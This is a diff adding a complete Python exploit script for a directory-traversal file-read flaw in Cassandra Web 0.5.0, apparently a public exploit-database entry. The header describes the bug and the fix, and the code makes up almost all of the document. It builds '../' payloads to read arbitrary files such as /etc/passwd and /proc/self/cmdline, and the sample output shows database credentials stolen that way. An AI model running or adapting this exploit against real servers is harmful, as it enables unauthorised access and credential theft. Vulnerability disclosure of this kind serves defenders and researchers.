@@ -1,0 +1,141 @@
+# Exploit Title: Cassandra Web 0.5.0 - Remote File Read
+# Date: 12-28-2020
+# Exploit Author: Jeremy Brown
+# Vendor Homepage: https://github.com/avalanche123/cassandra-web
+# Software Link: https://rubygems.org/gems/cassandra-web/versions/0.5.0
+# Version: 0.5.0
+# Tested on: Linux
+
+#!/usr/bin/python
+# -*- coding: UTF-8 -*-
+#
+# cassmoney.py
+#
+# Cassandra Web 0.5.0 Remote File Read Exploit
+#
+# Jeremy Brown [jbrown3264/gmail]
+# Dec 2020
+#
+# Cassandra Web is vulnerable to directory traversal due to the disabled
+# Rack::Protection module. Apache Cassandra credentials are passed via the
+# CLI in order for the server to auth to it and provide the web access, so
+# they are also one thing that can be captured via the arbitrary file read.
+#
+# Usage
+# > cassmoney.py 10.0.0.5 /etc/passwd
+# root:x:0:0:root:/root:/bin/bash
+# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# bin:x:2:2:bin:/bin:/usr/sbin/nologin
+# ...
+#
+# > cassmoney.py 10.0.0.5 /proc/self/cmdline
+# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
+#
+# (these creds are for auth to the running apache cassandra database server)
+#
+# Fix
+# - fixed in github repo
+# - v0.6.0 / ruby-gems when available
+# (still recommended to containerize / run this in some sandbox, apparmor, etc)
+#
+
+import os
+import sys
+import argparse
+import requests
+import urllib.parse
+
+SIGNATURE = 'cassandra.js'
+
+#
+# /var/lib/gems/2.7.0/gems/cassandra-web-0.5.0/app/public
+#
+DT = '../'
+DT_NUM = 8
+
+class CassMoney(object):
+	def __init__(self, args):
+		self.target = args.target
+		self.file = args.file
+		self.port = args.port
+		self.force = args.force
+		self.number = args.number
+
+	def run(self):
+		target = "http://" + self.target + ':' + str(self.port)
+
+		payload = urllib.parse.quote_plus(DT * self.number + self.file)
+
+		try:
+			deskpop = requests.get(target)
+		except Exception as error:
+			print("Error: %s" % error)
+			return -1
+
+		if(SIGNATURE not in deskpop.text and self.force == False):
+			print("Target doesn't look like Cassandra Web, aborting...")
+			return -1
+
+		try:
+			req = requests.get(target + '/' + payload)
+		except:
+			print("Failed to read %s (perm denied likely)" % self.file)
+			return -1
+
+		if(SIGNATURE in req.text):
+			print("Failed to read %s (bad path?)" % self.file)
+			return -1
+
+		if(len(req.text) == 0):
+			print("Server returned nothing for some reason")
+			return 0
+
+		print("\n%s" % req.text)
+
+		return 0
+
+def arg_parse():
+	parser = argparse.ArgumentParser()
+
+	parser.add_argument("target",
+						type=str,
+						help="Cassandra Web Host")
+
+	parser.add_argument("file",
+						type=str,
+						help="eg. /etc/passwd, /proc/sched_debug + /proc/<cass-web-pid>/cmdline")
+
+	parser.add_argument("-p",
+						"--port",
+						type=int,
+						default=3000,
+						help="Cassandra Web Port")
+
+	parser.add_argument("-f",
+						"--force",
+						default=False,
+						action='store_true',
+						help="Run the payload even if server isn't Cassandra Web")
+
+	parser.add_argument("-n",
+						"--number",
+						type=int,
+						default=DT_NUM,
+						help="Adjust the number of dot-dot-slash")
+
+	args = parser.parse_args()
+
+	return args
+
+def main():
+	args = arg_parse()
+
+	cm = CassMoney(args)
+
+	result = cm.run()
+
+	if(result > 0):
+		sys.exit(-1)
+
+if(__name__ == '__main__'):
+	main()
